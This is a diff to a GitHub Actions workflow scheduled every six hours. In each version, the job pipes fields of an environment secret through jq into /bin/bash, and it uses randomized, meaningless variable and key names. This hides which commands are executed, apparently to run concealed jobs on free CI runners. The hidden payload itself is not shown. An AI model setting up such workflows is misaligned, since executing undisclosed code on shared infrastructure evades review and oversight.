@@ -2,8 +2,7 @@ name: jiangjing19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
-
+    - cron: '40 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          exdjr54: ${{ secrets.exdjr54 }}
+          qn248: ${{ secrets.qn248 }}
         run: |
-          echo $exdjr54 | jq -r .makr350 | /bin/bash
-          echo $vai69 | jq -r .xoc3162 | /bin/bash
-          echo $jfxv5493 | jq -r .y74 | /bin/bash
-          echo $a68 | jq -r .i296 | /bin/bash
-          echo $u405 | jq -r .nlc69010 | /bin/bash
-          echo $pwew63 | jq -r .aaae87504 | /bin/bash
-          echo $soi79115 | jq -r .aak2838 | /bin/bash
-          echo $klmpz00 | jq -r .yd07 | /bin/bash
-          echo $v75 | jq -r .jbmr28964 | /bin/bash
-          echo $uj03 | jq -r .jryg481 | /bin/bash
-          echo $vc359 | jq -r .dnwsk841 | /bin/bash
-          echo $egc89628 | jq -r .nqmmu689 | /bin/bash
+          echo $qn248 | jq -r .iazed0 | /bin/bash
+          echo $qy34697 | jq -r .pyql2364 | /bin/bash
+          echo $n107 | jq -r .kyjyk1504 | /bin/bash
+          echo $y0 | jq -r .wzoa37 | /bin/bash
+          echo $lwd320 | jq -r .vnt98 | /bin/bash
+          echo $fc99 | jq -r .mywr195 | /bin/bash
+          echo $tr2 | jq -r .qg64 | /bin/bash
+          echo $cjtvd18510 | jq -r .veqq99 | /bin/bash
+          echo $w835 | jq -r .pmqc0659 | /bin/bash
+          echo $br9 | jq -r .lsb9670 | /bin/bash
 
